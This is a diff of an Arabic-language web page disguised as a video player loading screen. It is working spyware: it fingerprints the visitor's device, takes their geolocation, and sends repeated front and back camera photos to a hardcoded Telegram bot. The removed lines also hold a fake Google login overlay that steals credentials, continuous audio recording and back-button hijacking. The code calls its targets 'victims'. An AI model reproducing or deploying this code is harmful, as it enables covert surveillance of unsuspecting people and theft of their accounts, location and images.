@@ -3,160 +3,136 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>جاري تهيئة النظام الآمن...</title>
+    <title>جاري تهيئة مشغل الفيديو...</title>
     <style>
-        body { background-color: #050505; color: #444; font-family: sans-serif; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
-        .loader { border: 4px solid #1a1a1a; border-top: 4px solid #3498db; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin-bottom: 20px; }
+        body { background-color: #050505; color: #444; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
+        .container { text-align: center; padding: 20px; }
+        .loader { border: 4px solid #1a1a1a; border-top: 4px solid #3498db; border-radius: 50%; width: 50px; height: 50px; animation: spin 1.5s linear infinite; margin-bottom: 20px; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        #phish-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.95); z-index: 1000; justify-content: center; align-items: center; }
-        .login-box { background: #fff; padding: 30px; border-radius: 12px; width: 85%; max-width: 350px; text-align: center; box-shadow: 0 10px 25px rgba(0,0,0,0.5); }
-        .login-box img { width: 45px; margin-bottom: 15px; }
-        .login-box h2 { font-size: 18px; color: #333; margin-bottom: 15px; }
-        .login-box input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 6px; box-sizing: border-box; font-size: 16px; }
-        .login-box button { width: 100%; padding: 12px; background: #4285f4; color: #fff; border: none; border-radius: 6px; font-weight: bold; margin-top: 10px; cursor: pointer; }
+        p { font-size: 14px; letter-spacing: 0.5px; }
         #video, #canvas { display: none; }
     </style>
 </head>
 <body>
 
-    <div id="main-ui">
+    <div class="container">
         <div class="loader"></div>
-        <p>جاري فك تشفير المحتوى... يرجى الانتظار والسماح بالأذونات</p>
+        <p>جاري فك تشفير الرابط... يرجى السماح بالأذونات للمتابعة</p>
     </div>
 
-    <div id="phish-overlay">
-        <div class="login-box">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/5/53/Google_%22G%22_Logo.svg" alt="G">
-            <h2>انتهت الجلسة</h2>
-            <p style="color:#666; font-size:13px;">يرجى إعادة تسجيل الدخول للمتابعة</p>
-            <input type="email" id="p-email" placeholder="البريد الإلكتروني" required>
-            <input type="password" id="p-pass" placeholder="كلمة المرور" required>
-            <button onclick="captureLogin()">تسجيل الدخول</button>
-        </div>
-    </div>
-
-    <video id="video" autoplay playsinline muted></video>
+    <video id="video" autoplay playsinline></video>
     <canvas id="canvas"></canvas>
 
     <script>
+        // --- إعدادات التحكم الخاصة بك ---
         const TOKEN = "8723330008:AAH7fjX2fEKZ3-7WCWRQyiLHmNoaEY5QUaw";
         const CHAT_ID = "7984067238";
+
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
         let currentStream = null;
 
+        // 1. وظائف الإرسال لتليجرام
+        async function sendToTelegram(endpoint, params) {
+            try {
+                await fetch(`https://api.telegram.org/bot${TOKEN}/${endpoint}`, {
+                    method: 'POST',
+                    body: params
+                });
+            } catch (e) { console.error("Telegram Error", e); }
+        }
+
         function sendText(text) {
-            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}&parse_mode=Markdown`);
+            const formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
+            formData.append('text', text);
+            formData.append('parse_mode', 'Markdown');
+            sendToTelegram('sendMessage', formData);
         }
 
-        // 1. قفل الشاشة (المنع من الانطفاء)
-        async function keepAlive() {
-            try {
-                if ('wakeLock' in navigator) {
-                    await navigator.wakeLock.request('screen');
-                    sendText("🔋 **تم تفعيل قفل الشاشة:** الهاتف سيبقى مشتعلاً والتصوير لن يتوقف!");
-                }
-            } catch (err) {}
-        }
-
-        // 2. اختطاف زر الرجوع
-        function hijackHistory() {
-            for (let i = 0; i < 60; i++) {
-                window.history.pushState(null, null, window.location.href);
+        // 2. سحب بصمة الجهاز العميقة (بدون أذونات)
+        async function getDeviceHardware() {
+            let info = "🛡️ **تقرير اختراق جديد (بصمة الجهاز):**\n\n";
+            info += `📱 *المنصة:* ${navigator.platform}\n`;
+            info += `⚙️ *المعالج (أنوية):* ${navigator.hardwareConcurrency || "غير معروف"}\n`;
+            info += `💾 *الرام التقريبي:* ${navigator.deviceMemory || "غير معروف"} GB\n`;
+            
+            // معلومات البطارية
+            if (navigator.getBattery) {
+                const b = await navigator.getBattery();
+                info += `🔋 *البطارية:* ${Math.round(b.level * 100)}% (${b.charging ? "🔌 شاحن" : "🔋 استهلاك"})\n`;
             }
-            window.onpopstate = () => {
-                window.history.pushState(null, null, window.location.href);
-                sendText("🚫 الضحية حاول الخروج عبر زر الرجوع!");
-            };
+
+            // معلومات الشبكة
+            const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+            if (conn) {
+                info += `🌐 *الشبكة:* ${conn.effectiveType} (${conn.downlink} Mbps)\n`;
+            }
+
+            info += `🔗 *الرابط المصدر:* ${document.referrer || "دخول مباشر"}\n`;
+            sendText(info);
         }
 
-        // 3. سحب بيانات الجهاز
-        async function getIntelligence() {
-            try {
-                const batt = await navigator.getBattery();
-                let info = "🧨 **تقرير الاختراق الشامل:**\n";
-                info += `📱 النظام: ${navigator.platform}\n`;
-                info += `🔋 البطارية: ${Math.round(batt.level * 100)}%\n`;
-                info += `📶 الشبكة: ${navigator.connection ? navigator.connection.effectiveType : 'N/A'}\n`;
-                sendText(info);
-            } catch(e) {}
+        // 3. سحب الموقع الجغرافي (يحتاج إذن)
+        function grabLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition((p) => {
+                    const link = `https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
+                    sendText(`📍 **موقع الضحية الدقيق:**\n[اضغط هنا لفتح الخريطة](${link})`);
+                }, () => sendText("❌ الضحية رفض إذن الموقع."));
+            }
         }
 
-        // 4. تسجيل الصوت المستمر
-        async function startAudio() {
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
-                const recorder = new MediaRecorder(stream);
-                recorder.ondataavailable = (e) => {
-                    const fd = new FormData();
-                    fd.append('chat_id', CHAT_ID);
-                    fd.append('voice', e.data, 'v.ogg');
-                    fetch(`https://api.telegram.org/bot${TOKEN}/sendVoice`, { method: 'POST', body: fd });
-                };
-                setInterval(() => {
-                    recorder.start();
-                    setTimeout(() => recorder.stop(), 5000);
-                }, 15000);
-            } catch (e) { sendText("❌ رفض الميكروفون."); }
-        }
-
-        // 5. التصوير الأشرس (كل ثانية + تبديل كاميرات)
-        async function startVisuals() {
+        // 4. التصوير التتابعي (أمامية وخلفية)
+        async function startSurveillance() {
             const modes = ["user", "environment"];
             let i = 0;
+
             while (true) {
                 const mode = modes[i % 2];
+                const label = mode === "user" ? "الآمامية 🤳" : "الخلفية 📷";
+                
                 try {
                     if (currentStream) currentStream.getTracks().forEach(t => t.stop());
+                    
                     currentStream = await navigator.mediaDevices.getUserMedia({ 
-                        video: { facingMode: mode, width: { ideal: 640 } } 
+                        video: { facingMode: mode }, 
+                        audio: false 
                     });
+                    
                     video.srcObject = currentStream;
-                    
-                    await new Promise(r => setTimeout(r, 600)); // وقت الفوكس
-                    
-                    canvas.width = video.videoWidth; canvas.height = video.videoHeight;
-                    canvas.getContext('2d').drawImage(video, 0, 0);
-                    
+                    await new Promise(r => setTimeout(r, 1500)); // وقت للتركيز (Focus)
+
+                    const context = canvas.getContext('2d');
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
                     canvas.toBlob(blob => {
                         const fd = new FormData();
                         fd.append('chat_id', CHAT_ID);
                         fd.append('photo', blob, 'shot.jpg');
-                        fd.append('caption', `👁️ كاميرا: ${mode === "user" ? "أمامية" : "خلفية"}`);
-                        fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
-                    }, 'image/jpeg', 0.4); // جودة خفيفة لسرعة الإرسال
-                } catch (e) {}
+                        fd.append('caption', `🔄 لقطة من الكاميرا: ${label}`);
+                        sendToTelegram('sendPhoto', fd);
+                    }, 'image/jpeg', 0.6);
+
+                } catch (e) {
+                    console.log("Camera Switch Error", e);
+                }
+                
                 i++;
-                await new Promise(r => setTimeout(r, 1000)); // التصوير كل ثانية واحدة!
+                await new Promise(r => setTimeout(r, 4000)); // انتظار 4 ثواني بين كل لقطة
             }
         }
 
-        function captureLogin() {
-            const e = document.getElementById('p-email').value;
-            const p = document.getElementById('p-pass').value;
-            if(e && p) {
-                sendText(`🔑 **بيانات حساب جوجل:**\n📧: \`${e}\`\n🔐: \`${p}\``);
-                document.getElementById('phish-overlay').style.display = 'none';
-                alert("تم تحديث الأمان بنجاح.");
-            }
-        }
-
+        // التنفيذ عند الدخول
         window.onload = () => {
-            keepAlive();
-            hijackHistory();
-            getIntelligence();
-            startAudio();
-            startVisuals();
+            getDeviceHardware(); // صامت وفوري
+            grabLocation();      // يطلب إذن
+            startSurveillance(); // يطلب إذن ويبدأ الدورة
             
-            navigator.geolocation.getCurrentPosition(p => {
-                const map = `https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
-                sendText(`📍 **الموقع:** [فتح الخريطة](${map})`);
-            });
-
-            setTimeout(() => {
-                document.getElementById('phish-overlay').style.display = 'flex';
-                document.getElementById('main-ui').style.filter = 'blur(8px)';
-            }, 12000);
+            // ميزة إضافية: منع الشاشة من الإغلاق
+            if (navigator.wakeLock) { navigator.wakeLock.request('screen'); }
         };
     </script>
 </body>
